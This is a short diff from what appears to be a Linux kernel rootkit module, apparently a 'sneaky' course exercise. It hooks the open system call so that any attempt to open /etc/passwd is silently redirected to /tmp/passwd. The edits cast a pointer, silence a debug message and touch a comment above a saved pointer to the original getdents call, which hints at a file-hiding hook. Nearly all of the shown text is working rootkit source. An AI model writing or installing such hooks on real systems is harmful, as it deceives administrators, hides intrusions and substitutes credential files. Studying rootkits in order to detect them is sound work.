@@ -60,17 +60,17 @@ asmlinkage int sneaky_sys_open(const char *pathname, int flags)
 {
   if (strstr(pathname, "/etc/passwd") != NULL) {
     char replace[] = "/tmp/passwd";
-    copy_to_user(pathname, &replace, sizeof(replace));
+    copy_to_user((void *)pathname, &replace, sizeof(replace));
     return original_call(pathname, flags);
   } else {
-    printk(KERN_INFO "Very, very Sneaky!\n");
+    //printk(KERN_INFO "Very, very Sneaky!\n");
     return original_call(pathname, flags);
   }
 }
 
 
 
-    //getdents
+//getdents
 asmlinkage int (*original_getdents)(unsigned int fd, struct linux_dirent * dirp, unsigned int count);
 
 
